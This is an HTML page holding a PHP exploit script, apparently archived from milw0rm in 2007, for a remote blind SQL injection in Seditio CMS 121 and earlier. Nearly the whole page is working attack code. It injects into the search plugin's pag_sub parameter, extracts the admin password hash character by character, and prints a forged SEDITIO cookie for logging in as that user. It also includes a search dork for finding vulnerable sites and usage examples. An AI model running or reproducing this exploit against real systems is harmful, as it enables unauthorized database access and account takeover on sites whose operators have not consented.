<html><head><title>Seditio CMS <= 121 Remote SQL Injection Exploit </title></head><pre>&lt;?php
## Seditio CMS &lt;= 121 Remote SQL Injection Exploit
## Software site: http://www.neocrome.net/
## By InATeam (http://inattack.ru/)
## Requirements: MySQL &gt;= 4.1, magic_quotes_gpc=Off

echo &quot;------------------------------------------------------------\n&quot;;
echo &quot;Seditio CMS &lt;= 121 Remote SQL Injection Exploit\n&quot;;
echo &quot;(c)oded by Raz0r, InATeam (http://inattack.ru/)\n&quot;;
echo &quot;dork: \&quot;Powered by Seditio\&quot;\n&quot;;
echo &quot;------------------------------------------------------------\n&quot;;

if ($argc&lt;2) {
echo &quot;USAGE:\n&quot;;
echo &quot;~~~~~~\n&quot;;
echo &quot;php {$argv[0]} [url] OPTIONS\n\n&quot;;
echo &quot;[url]        - target server where Seditio CMS is installed\n\n&quot;;
echo &quot;OPTIONS:\n&quot;;
echo &quot;-p=&lt;prefix&gt;  - use specific prefix (default sed_)\n&quot;;
echo &quot;-id=&lt;id&gt;     - use specific user id (default 1)\n\n&quot;;
echo &quot;examples:\n&quot;;
echo &quot;php {$argv[0]} http://site.com/ -p=cms_\n&quot;;
echo &quot;php {$argv[0]} http://cms.site.com:8080/ -id=2\n&quot;;
die;
}

error_reporting(0);
set_time_limit(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,10);
$url = $argv[1];
for($i=2;$i&lt;$argc;$i++) {
   if(strpos($argv[$i],&quot;=&quot;)!==false) {
       $exploded=explode(&quot;=&quot;,$argv[$i]);
       if ($exploded[0]=='-p') $prefix = $exploded[1];
       if ($exploded[0]=='-id') $id = $exploded[1];
   }
}
if (!isset($prefix)) $prefix = &quot;sed_&quot;;
if (!isset($id)) $id = 1;
$url_parts = parse_url($url);
$host = $url_parts['host'];
if (isset($url_parts['port'])) $port = $url_parts['port']; else $port = 80;
$path = $url_parts['path'];
print(&quot;[~] Connecting... &quot;);
if (!getchar(&quot;&lt;1&quot;,$i,false)) print(&quot;OK\n&quot;);
else die(&quot;\n[-] Exploit failed\n&quot;);
print(&quot;    Getting hash...&quot;);
$hash='';
for ($i=1; $i&lt;=32; $i++) {
   if (!getchar(&quot;&gt;57&quot;,$i)) {
       $min = 48;
       $max = 57;           }
   else {
       $min = 97;
       $max = 102;           }
   for($j=$min;$j&lt;=$max;$j++) {
       if (getchar(&quot;+LIKE+$j&quot;,$i)) {
           $hash .= chr($j);
           break;
       }
   }
}
print(&quot;[+] Done! hash - $hash\n&quot;);
print(&quot;[+] Cookie to log in: \nSEDITIO=&quot;.base64_encode($id.&quot;:_:&quot;.$hash.&quot;:_:ice&quot;).&quot;\n&quot;);

function getchar($query,$pos,$status=true){
   global $host,$path,$prefix,$id;
   if ($status) status();
   $data = &quot;sq=InATeam&amp;frm_sub%5B%5D=9999&amp;sea_frmtitle=1&amp;sea_frmtext=1&amp;sea_pagtitle=1&quot;;
   $data.= &quot;&amp;sea_pagdesc=1&amp;sea_pagtext=1&amp;searchin_pag=1&amp;pag_sub%5B%5D=qwerty')&quot;;
   $data.= &quot;+AND+1=IF(ORD(MID((SELECT+user_password+FROM+{$prefix}users+WHERE&quot;;
   $data.= &quot;+user_id={$id}),{$pos},1)){$query},1,(SELECT+1+UNION+SELECT+5))/*&amp;x=GUEST&quot;;
      $packet  = &quot;POST {$path}plug.php?e=search&amp;a=search HTTP/1.1\r\n&quot;;
   $packet .= &quot;Host: {$host}\r\n&quot;;
   $packet .= &quot;Referer: http://{$host}{$path}plug.php?e=search&amp;a=search\r\n&quot;;
   $packet .= &quot;User-Agent: InAttack User Agent\r\n&quot;;
   $packet .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
   $packet .= &quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
   $packet .= &quot;Connection: Close\r\n\r\n&quot;;
   $packet .= $data;
   return (strpos(send($packet),'Subquery returns more than 1 row')===false) ? true : false;
}

function send($packet) {
   global $host,$port;
   $ock = fsockopen(gethostbyname($host),$port);
   if ($ock) {
       fputs($ock, $packet);
       $html='';
       while (!feof($ock)) $html.=fgets($ock);
   }
   else die(&quot;[-] Exploit failed\n&quot;);
   return $html;
}

function status() {
   static $n;
   $n++;
   if ($n &gt; 3) $n = 0;
   if($n==0){ print &quot;\r[-]\r&quot;; }
   if($n==1){ print &quot;\r[\\]\r&quot;;}
   if($n==2){ print &quot;\r[|]\r&quot;; }
   if($n==3){ print &quot;\r[/]\r&quot;; }
}
?&gt;

# milw0rm.com [2007-11-29]</pre></html>